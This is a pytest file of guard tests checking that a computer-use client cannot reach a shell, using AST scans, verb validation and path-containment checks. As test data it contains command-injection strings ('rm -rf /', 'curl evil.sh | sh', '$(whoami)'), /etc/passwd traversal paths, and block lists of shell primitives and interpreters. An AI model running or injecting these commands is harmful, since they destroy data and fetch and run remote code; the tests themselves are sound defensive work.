"""The computer-use client must never be able to reach a shell.

These are guard tests, not behaviour tests: they read the client's source and
fail the build if a shell primitive appears in it, and they push hostile inputs
through the verb contract to check each one is refused rather than sanitised.

The operator's requirement was absolute — "ZERO CHANCE FOR SHELL ACCESS OF ANY
KIND" — so it is checked mechanically rather than left to review.
"""
import ast
import re
from pathlib import Path

import pytest

from backend import computeruse as cu

CLIENT_DIR = Path(__file__).resolve().parents[1] / "clients" / "computeruse"
CLIENT = CLIENT_DIR / "agent.py"
# every module in the client is scanned, not just the entry point -- the macOS
# backend is where a convenient osascript shim would otherwise appear
CLIENT_FILES = sorted(CLIENT_DIR.glob("*.py"))
SOURCE = "\n".join(f.read_text() for f in CLIENT_FILES)
TREES = {f.name: ast.parse(f.read_text()) for f in CLIENT_FILES}
TREE = TREES["agent.py"]


# --- 1. the client's source may not contain a way to execute a string --------

# Exact dotted names, so re.compile (fine) is not confused with builtin compile
# (not fine) and the client's own Runner.run is not confused with subprocess.run.
BANNED_DOTTED = {
    "os.system", "os.popen",
    "subprocess.getoutput", "subprocess.getstatusoutput",
    "pty.spawn", "commands.getoutput",
}
BANNED_BARE = {"eval", "exec", "compile", "__import__"}
BANNED_PREFIX = ("os.exec", "os.spawn", "os.posix_spawn")


def _calls():
    """(dotted-name, node) for every call anywhere in the client."""
    for tree in TREES.values():
      for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        parts, f = [], node.func
        while isinstance(f, ast.Attribute):
            parts.append(f.attr)
            f = f.value
        if isinstance(f, ast.Name):
            parts.append(f.id)
        yield ".".join(reversed(parts)), node


def test_client_never_calls_an_interpreter():
    hits = []
    for dotted, _ in _calls():
        if dotted in BANNED_DOTTED or dotted.startswith(BANNED_PREFIX):
            hits.append(dotted)
        # a bare eval(...) is the builtin; re.compile is not
        if dotted in BANNED_BARE:
            hits.append(dotted)
    assert not hits, f"client calls {hits} — each is a way to execute a string"


def test_client_never_passes_shell_true():
    """shell=True anywhere turns an argv list back into a command line."""
    bad = []
    for dotted, node in _calls():
        for kw in node.keywords:
            if kw.arg == "shell" and not (
                    isinstance(kw.value, ast.Constant) and kw.value.value is False):
                bad.append(f"{dotted}(shell={ast.dump(kw.value)})")
    assert not bad, f"shell= is not literally False at: {bad}"


def test_subprocess_is_only_ever_given_an_argv_list():
    """subprocess must receive a list. A string first argument is the thing a
    shell would split, so the argument's type is the control."""
    checked = 0
    for dotted, node in _calls():
        if not dotted.startswith("subprocess.") or not node.args:
            continue
        checked += 1
        first = node.args[0]
        assert isinstance(first, (ast.List, ast.Name)), (
            f"{dotted} first arg is {type(first).__name__}: not an argv list")
    assert checked, "no subprocess calls found — has the client been restructured?"


def test_no_shell_command_string_is_ever_passed_to_a_call():
    """Prose may discuss os.system; code may not build 'sh -c ...'. This looks
    at string literals in argument position only, so documentation is free to
    explain what is banned."""
    pattern = re.compile(r"\b(sh|bash|zsh|dash)\b\s+-[a-z]*c\b|\|\s*(sh|bash)\b")
    for dotted, node in _calls():
        for arg in list(node.args) + [kw.value for kw in node.keywords]:
            if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
                assert not pattern.search(arg.value), (
                    f"{dotted} is passed a shell command string: {arg.value!r}")


def test_binary_allowlist_is_closed_and_small():
    """Every executable the client may run is named in BANNED-adjacent
    BINARIES, resolved once, and nothing else is reachable."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    assert set(mod.BINARIES) <= {
        "mpv", "pactl", "wpctl", "xdg-open", "xrandr", "open"}
    # neither a shell nor anything that evaluates a language. osascript counts:
    # AppleScript has `do shell script`, so it is a shell by another door.
    for interp in ("sh", "bash", "zsh", "fish", "python", "python3", "perl",
                   "env", "osascript", "ruby", "node", "awk"):
        assert interp not in mod.BINARIES, f"{interp} must not be runnable"


def test_runner_rejects_a_binary_outside_the_allowlist():
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent2", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    r = mod.Runner(dry_run=True)
    with pytest.raises(mod.Refused):
        r.run("sh", "-c", "echo pwned")
    with pytest.raises(mod.Refused):
        r.run("/bin/sh")


# --- 2. the verb contract refuses hostile input rather than cleaning it ------

def test_unknown_verbs_are_refused():
    for verb in ("exec", "shell", "run_code", "eval", ""):
        with pytest.raises(cu.VerbError):
            cu.validate(verb, {})


def test_unknown_parameters_are_refused_not_ignored():
    """Dropping an unexpected field silently is how a caller ends up believing
    a control was applied when it was not."""
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "up", "command": "rm -rf /"})


@pytest.mark.parametrize("payload", [
    "up; rm -rf /", "up && curl evil.sh | sh", "$(whoami)", "`id`", "up\nrm -rf /",
])
def test_enum_fields_reject_injection_attempts(payload):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": payload})


@pytest.mark.parametrize("url", [
    "file:///etc/passwd", "javascript:alert(1)", "data:text/html,<script>",
    "smb://server/share", "vnc://host", "ssh://host", "not a url", "",
])
def test_only_http_urls_may_be_opened(url):
    with pytest.raises(cu.VerbError):
        cu.validate("open_link", {"url": url})


def test_http_urls_pass():
    assert cu.validate("open_link", {"url": "https://example.com/x"})["url"]


@pytest.mark.parametrize("device", [
    "sink; rm -rf /", "$(id)", "a" * 250, "sink`id`",
    "sink&touch /tmp/x", "sink'quoted'", 'sink"quoted"', "sink\nrm -rf /",
    "sink|cat", "x>y", "x<y", "sink*", "~root", "  leading", "trailing  ",
    "sink\x00null", "sink\x1b[2J",
])
def test_device_fields_reject_shell_metacharacters_and_control_chars(device):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "up", "device": device})


@pytest.mark.parametrize("device", [
    "Built-in Audio Analog Stereo",          # a pactl description
    "desk speakers",                         # a fragment the operator would say
    "HDMI / DisplayPort 1 (plugged in)",     # real label punctuation
])
def test_device_fields_accept_a_human_name_to_match_on(device):
    """Spaces and parentheses are allowed on purpose: the field doubles as a
    NAME to match, so the model can pass "desk speakers" instead of preflighting
    with computer_status.

    That is safe for two independent reasons. Nothing reaches a shell — argv is
    a list with shell=False, so a space is just a space. And the client resolves
    whatever arrives against the devices it enumerated itself, so the string that
    actually lands in argv is one of its own ids. The next test is that second
    guarantee.
    """
    assert cu.validate("volume", {"action": "up", "device": device})["device"]


def test_a_resolved_device_comes_from_the_machines_own_list(tmp_path):
    """The compensating control for accepting free-ish text: the model's phrase
    is only ever a search key. What reaches the command line is enumerated
    locally, so widening the field did not widen what can be executed."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_res", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    agent = mod.Agent("http://x", "t", [], "t", dry_run=True)
    options = [{"id": "alsa_output.usb-Focusrite", "label": "Scarlett Desk Speakers"}]
    got = agent.os._resolve_device("desk speakers", options, "output")
    assert got == "alsa_output.usb-Focusrite"
    assert got in [o["id"] for o in options]


@pytest.mark.parametrize("device", [
    "pulse/alsa_output.pci-0000_00_1f.3.analog-stereo",
    "coreaudio/AppleHDAEngineOutput:1F,3,0,1:0",
    "alsa/default:CARD=PCH",
])
def test_real_mpv_device_names_are_accepted(device):
    """mpv names outputs "<ao>/<device>", so the slash has to survive
    validation — the first cut rejected every legitimate device id."""
    assert cu.validate("play", {"kind": "audio", "path": "/a/b.mp3",
                                "device": device})["device"] == device


@pytest.mark.parametrize("value", [-1, 101, 1000, True, "5", 3.5])
def test_bounded_integers_are_bounded(value):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "set", "percent": value})


def test_titles_may_not_carry_control_characters():
    with pytest.raises(cu.VerbError):
        cu.validate("play", {"kind": "audio", "path": "/x/y.mp3",
                             "title": "hi\x1b]0;pwned\x07"})


def test_relative_and_null_paths_are_refused():
    for p in ("../../etc/passwd", "x.mp3", "/x/\x00.mp3"):
        with pytest.raises(cu.VerbError):
            cu.validate("play", {"kind": "audio", "path": p})


# --- 3. grant containment, lexical on the host -------------------------------
#
# The host cannot see the operator's disk, so its check is a string check: a
# useful early error, not the control. The real check is the client's, below.

@pytest.mark.asyncio
async def test_a_path_outside_every_grant_is_refused(monkeypatch):
    async def grants(db=None):
        return [cu.Grant(1, "/Users/you/Movies", "films")]
    monkeypatch.setattr(cu, "list_grants", grants)

    assert await cu.path_within_grants("/Users/you/Movies/Dune.mkv")
    assert await cu.path_within_grants("Dune.mkv")            # relative to the root
    for bad in ("/etc/passwd", "/Users/you/Documents/tax.pdf", "/Users/you"):
        with pytest.raises(cu.VerbError):
            await cu.path_within_grants(bad)


@pytest.mark.asyncio
async def test_dot_dot_cannot_climb_out_of_a_grant(monkeypatch):
    async def grants(db=None):
        return [cu.Grant(1, "/Users/you/Movies", "films")]
    monkeypatch.setattr(cu, "list_grants", grants)
    for bad in ("/Users/you/Movies/../../../etc/passwd",
                "../../etc/passwd", "/Users/you/Movies/../Documents/x.mkv"):
        with pytest.raises(cu.VerbError):
            await cu.path_within_grants(bad)


@pytest.mark.asyncio
async def test_a_remote_path_is_accepted_without_existing_here(monkeypatch):
    """The whole bug this replaced: the host required the folder to exist
    locally, so no macOS path could ever be granted or played."""
    async def grants(db=None):
        return [cu.Grant(1, "/Users/grant/Movies", "mac films")]
    monkeypatch.setattr(cu, "list_grants", grants)
    got = await cu.path_within_grants("/Users/grant/Movies/Heat.mkv")
    assert got == "/Users/grant/Movies/Heat.mkv"
    assert not Path(got).exists(), "the point is that it does not exist here"


@pytest.mark.asyncio
async def test_with_no_grants_nothing_is_reachable(monkeypatch):
    async def none(db=None):
        return []
    monkeypatch.setattr(cu, "list_grants", none)
    with pytest.raises(cu.VerbError):
        await cu.path_within_grants("/Users/you/Music/x.mp3")


@pytest.mark.asyncio
async def test_an_ambiguous_relative_path_asks_instead_of_picking(monkeypatch):
    async def grants(db=None):
        return [cu.Grant(1, "/a/Media", "a"), cu.Grant(2, "/b/Media", "b")]
    monkeypatch.setattr(cu, "list_grants", grants)
    with pytest.raises(cu.VerbError) as e:
        await cu.path_within_grants("Dune.mkv")
    assert "ambiguous" in str(e.value)


# --- 4. the client's own containment, independent of the backend ------------

def _agent(tmp_path, roots):
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent3", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod, mod.Agent("http://x", "t", roots, "test", dry_run=True)


def test_client_refuses_a_path_the_backend_says_is_fine(tmp_path):
    """The backend could be compromised; this check is what makes that
    survivable."""
    root = tmp_path / "Music"
    root.mkdir()
    (root / "ok.mp3").write_bytes(b"\0")
    outside = tmp_path / "outside.mp3"
    outside.write_bytes(b"\0")
    mod, agent = _agent(tmp_path, [str(root)])

    assert agent.check_playable(str(root / "ok.mp3"), "audio")
    with pytest.raises(mod.Refused):
        agent.check_playable(str(outside), "audio")
    with pytest.raises(mod.Refused):
        agent.check_playable("/etc/passwd", "audio")


def test_server_grants_cannot_widen_the_client_ceiling(tmp_path):
    """--allow-root is the ceiling. A grant naming somewhere else is dropped."""
    allowed = tmp_path / "Music"
    allowed.mkdir()
    elsewhere = tmp_path / "Documents"
    elsewhere.mkdir()
    mod, agent = _agent(tmp_path, [str(allowed)])

    agent.set_grants([str(elsewhere), "/etc", str(allowed)])
    assert agent.grants == [allowed.resolve()]

    (elsewhere / "x.mp3").write_bytes(b"\0")
    with pytest.raises(mod.Refused):
        agent.check_playable(str(elsewhere / "x.mp3"), "audio")


def test_client_rejects_unknown_verbs_and_params(tmp_path):
    mod, agent = _agent(tmp_path, [])
    with pytest.raises(mod.Refused):
        agent.handle("exec", {"cmd": "id"})
    with pytest.raises(mod.Refused):
        agent.handle("volume", {"action": "up", "extra": "x"})
    with pytest.raises(mod.Refused):
        agent.handle("open_link", {"url": "file:///etc/passwd"})


def test_mpv_is_launched_without_config_or_scripts(tmp_path):
    """mpv reads ~/.config/mpv by default and a Lua script there would be
    arbitrary code executing off the back of a play command."""
    root = tmp_path / "Music"
    root.mkdir()
    f = root / "a.mp3"
    f.write_bytes(b"\0")
    mod, agent = _agent(tmp_path, [str(root)])
    calls = []
    agent.runner.bin["mpv"] = "/usr/bin/mpv"
    agent.runner.run = lambda name, *a, **k: calls.append((name, a)) or None

    agent.handle("play", {"kind": "audio", "path": str(f)})
    name, args = calls[-1]
    assert name == "mpv"
    assert "--no-config" in args and "--load-scripts=no" in args
    # the file must come after -- so a filename can never be read as an option
    assert "--" in args and args.index("--") == len(args) - 2


# --- 5. the macOS backend ----------------------------------------------------

def _macos():
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "cu_macos_t", CLIENT_DIR / "macos.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_macos_fourcc_constants_match_the_sdk_headers():
    """Verified against CoreAudio.framework AudioHardware.h /
    AudioHardwareBase.h. Getting one of these wrong is a silent no-op or a
    write to the wrong property, so they are pinned."""
    m = _macos()
    assert m.fourcc("dOut") == 0x644F7574        # kAudioHardwarePropertyDefaultOutputDevice
    assert m.fourcc("volm") == 0x766F6C6D        # kAudioDevicePropertyVolumeScalar
    assert m.fourcc("vmvc") == 0x766D7663        # ..._VirtualMainVolume
    assert m.fourcc("mute") == 0x6D757465        # kAudioDevicePropertyMute
    assert m.fourcc("glob") == 0x676C6F62        # kAudioObjectPropertyScopeGlobal
    assert m.fourcc("outp") == 0x6F757470        # kAudioObjectPropertyScopeOutput
    assert m.kAudioObjectSystemObject == 1
    assert m.kElementMaster == 0


def test_macos_backend_spawns_no_processes_for_volume_or_transport():
    """The whole point of the CoreAudio/Quartz route: no subprocess, so no
    interpreter, so nothing to quote."""
    tree = TREES["macos.py"]
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            parts, f = [], node.func
            while isinstance(f, ast.Attribute):
                parts.append(f.attr)
                f = f.value
            if isinstance(f, ast.Name):
                parts.append(f.id)
            dotted = ".".join(reversed(parts))
            assert not dotted.startswith("subprocess."), dotted
            assert "osascript" not in dotted


def test_macos_media_key_codes_are_the_documented_ones():
    m = _macos()
    assert (m.NX_KEYTYPE_PLAY, m.NX_KEYTYPE_NEXT, m.NX_KEYTYPE_PREVIOUS) == (16, 17, 18)
    assert m.NSSystemDefined == 14
    assert m.MEDIA_KEYS["next"] == 17 and m.MEDIA_KEYS["previous"] == 18


def test_macos_module_never_mentions_osascript_as_something_to_run():
    src = (CLIENT_DIR / "macos.py").read_text()
    for node in ast.walk(TREES["macos.py"]):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            # prose explaining why it is avoided is fine; a bare command is not
            assert not node.value.strip().startswith("osascript"), node.value


# --- 6. the one unauthenticated route ----------------------------------------

@pytest.mark.asyncio
async def test_rejected_pairing_attempts_raise_one_alert_per_burst(monkeypatch):
    """The agent socket takes a pairing token instead of a session cookie, so
    it is the one route a published Jarvis exposes to anyone who gets past
    whatever fronts it. Failures have to be visible — but a scanner must raise
    one alert, not thousands, or it buries the Review Center."""
    import backend.computeruse_api as api
    from backend import security

    api._bad_attempts.clear()
    events = []

    async def fake_raise(db, **kw):
        events.append(kw)
    monkeypatch.setattr(security, "raise_event", fake_raise)

    for _ in range(25):
        await api._note_bad_token("203.0.113.9")
    assert len(events) == 1, "a burst must dedupe to one alert"
    assert "203.0.113.9" in events[0]["summary"]
    assert events[0]["severity"] == "warn"

    # a second source is its own burst
    for _ in range(3):
        await api._note_bad_token("198.51.100.4")
    assert len(events) == 2
    assert "198.51.100.4" in events[1]["summary"]


@pytest.mark.asyncio
async def test_a_single_typo_does_not_cry_wolf(monkeypatch):
    """One or two failures is somebody fat-fingering a token."""
    import backend.computeruse_api as api
    from backend import security
    api._bad_attempts.clear()
    events = []

    async def fake_raise(db, **kw):
        events.append(kw)
    monkeypatch.setattr(security, "raise_event", fake_raise)

    await api._note_bad_token("10.0.0.5")
    await api._note_bad_token("10.0.0.5")
    assert events == []


def test_the_pairing_token_is_long_enough_to_be_unguessable():
    """256 bits from secrets.token_urlsafe, compared with compare_digest. The
    delay and the alert above are for noise, not for brute force — this is what
    makes brute force pointless."""
    import inspect
    src = inspect.getsource(cu.pairing_token)
    assert "token_urlsafe(32)" in src
    assert "compare_digest" in inspect.getsource(cu.check_token)
